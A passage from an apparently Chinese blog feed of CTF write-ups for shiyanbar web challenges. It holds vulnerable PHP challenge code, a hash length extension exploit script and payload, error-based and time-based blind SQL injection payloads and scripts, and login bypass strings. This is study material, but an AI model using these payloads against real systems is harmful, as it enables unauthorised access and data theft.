(sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">      die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>md5弱类型</p><p><img src="12-2.png" alt></p><h2 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h2><p><img src="13-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'password'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'password'</span>])</span><br><span class="line">        die (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>清空cookie，password也为空</p><p><img src="13-2.png" alt></p><h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p><img src="14-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="14-2.png" alt></p><h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p><img src="15-1.png" alt></p><p><img src="15-2.png" alt></p><p>查看源代码发现</p><p><img src="15-3.png" alt></p><p><img src="15-4.png" alt></p><p><img src="15-5.png" alt></p><p>因为是vim 考虑源码泄露 尝试 .submit.php.swp</p><p><img src="15-6.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$token</span>)&amp;&amp;!empty(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$token</span>)!=10) die(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">'0'</span>) die(<span class="string">'fail'</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT count(*) as num from `user` where token='<span class="variable">$token</span>' AND email='<span class="variable">$emailAddress</span>'"</span>;</span><br><span class="line"><span class="variable">$r</span> = mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'db error'</span>);</span><br><span class="line"><span class="variable">$r</span> = mysql_fetch_assoc(<span class="variable">$r</span>);</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span>&gt;0)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token要等于0而且长度要等于10    0000000000</p><p><img src="15-7.png" alt></p><h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p><img src="16-1.png" alt></p><p><img src="16-2.png" alt></p><p>输入username=QNKCDZO</p><p><img src="16-3.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">     <span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>伟大的科学家php方言道：成也布尔，败也布尔。<br>回去吧骚年</p><p>分析：<br>　　代码意思是把post提交的password值经过”反序列化”得到一个数组，要求数组里的user和pass都等于某个值时就打印flag。<br>　　但是我们不知道两处???到底是什么，因此无法考虑用php函数构造这样的值。<br>　　别忘了还有一个提示： “伟大的科学家php方言道：成也布尔，败也布尔” ，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>　　构造password值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>　　在密码栏中提交构造的值，即可获取flag: ctf{dwduwkhduw5465}</p><p><img src="16-4.png" alt></p><h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p><img src="17-1.png" alt></p><p><img src="17-2.png" alt></p><p><img src="17-3.png" alt></p><p><img src="17-4.png" alt></p><h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p><img src="18-1.png" alt></p><p>应该是题目出了问题，直接访问index.php得到flag</p><p><img src="18-2.png" alt></p><h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p><img src="19-1.png" alt></p><p><img src="19-2.png" alt></p><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hash长度扩展攻击<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br><span class="line"></span><br><span class="line">得到：getmein:e18dfd8404515016d3aeeea2aa196909</span><br></pre></td></tr></table></figure></p><p>burp抓包改包<br>username=admin<br>password=admin+\x80\x00……admin<br>\x80\x00要在hex里面修改</p><p><img src="19-3.png" alt></p><p><img src="19-4.png" alt></p><p>或者用<br>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</p><p><img src="19-5.png" alt></p><h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p><img src="20-1.png" alt></p><p><img src="20-2.png" alt></p><p><img src="20-3.png" alt></p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p><h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p><img src="21-1.png" alt></p><p>双写绕过加上空格过滤</p><p><img src="21-2.png" alt></p><h2 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h2><p><img src="22-1.png" alt></p><p><img src="22-2.png" alt></p><h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p><img src="23-1.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(SELECT database())a))–+</p><p><img src="23-2.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select group_concat(table_name) from information_schema.tables where table_schema=’web1’)a))–+</p><p><img src="23-3.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select group_concat(column_name) from information_schema.columns where table_name=’flag’ )a))–+</p><p><img src="23-4.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select flag from flag)a))–+</p><p><img src="23-5.png" alt></p><h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><p><img src="24-1.png" alt></p><p><img src="24-2.png" alt></p><p><img src="24-3.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </span><br><span class="line">        <span class="built_in">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">die(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p><p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup  （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2  （从第二行开始查询）</p><p>#注释<br>此时密码只要为空即可查询成功 </p><p><img src="24-4.png" alt></p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><p><img src="25-1.png" alt></p><p><img src="25-2.png" alt></p><p><img src="25-3.png" alt></p><p>发现逗号之后内容的都截断了</p><p><img src="25-4.png" alt></p><p>尝试xff注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">allString=string.lowercase + string.uppercase + string.digits</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,33):</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> allString:</span><br><span class="line">        data=<span class="string">"11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1"</span>.format(str(i),str1)</span><br><span class="line">        headers=&#123;<span class="string">"x-forwarded-for"</span>:data&#125;</span><br><span class="line">        try:</span><br><span class="line">            res=requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout, e:</span><br><span class="line">            flag += str1</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'flag:'</span> + flag</span><br></pre></td></tr></table></figure></p><p>即可跑出</p><p><img src="25-5.png" alt></p><h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><p><img src="26-1.png" alt></p><p><img src="26-2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=’\<span class="variable">$_POST</span>[‘user’]’ and password=’\<span class="variable">$_POST</span>[‘password’]’”;</span><br><span class="line">输入username= <span class="string">'='</span>   password= <span class="string">'='</span></span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=<span class="string">''</span>=<span class="string">''</span> and password=<span class="string">''</span>=<span class="string">''</span> </span><br><span class="line">user=”返回的是NULL=”也是符合条件的，最后就是</span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> 1 and 1”;</span><br></pre></td></tr></table></figure><p><img src="26-3.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;西普实验吧-web题目学习&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="实验吧" scheme="http://archimesan.me/categories/CTF/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
    
      <category term="实验吧" scheme="http://archimesan.me/tags/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite 中文乱码</title>
    <link href="http://archimesan.me/2018/02/01/Burpsuite-%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/"/>
    <id>http://archimesan.me/2018/02/01/Burpsuite-中文乱码/</id>
    <published>2018-02-01T02:41:43.000Z</published>
    <updated>2019-03-26T09:24:12.063Z</updated>
    
